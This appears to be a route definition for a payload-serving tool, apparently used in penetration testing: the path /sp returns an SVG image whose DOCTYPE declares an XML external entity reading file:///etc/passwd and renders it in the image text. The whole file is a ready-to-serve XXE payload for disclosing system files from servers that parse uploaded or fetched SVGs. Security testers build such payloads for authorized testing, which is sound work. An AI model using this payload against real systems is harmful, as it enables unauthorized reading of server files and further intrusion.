---
title: XXE SVG Passwd
description: Returns an SVG payload with XXE to get files
weight: 1
pattern: /sp$
is_final: true
data:
  headers:
    Content-Type: image/svg+xml
  body: |
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
    <svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
    </svg>

---


### /sp

attempts to get /etc/passwd
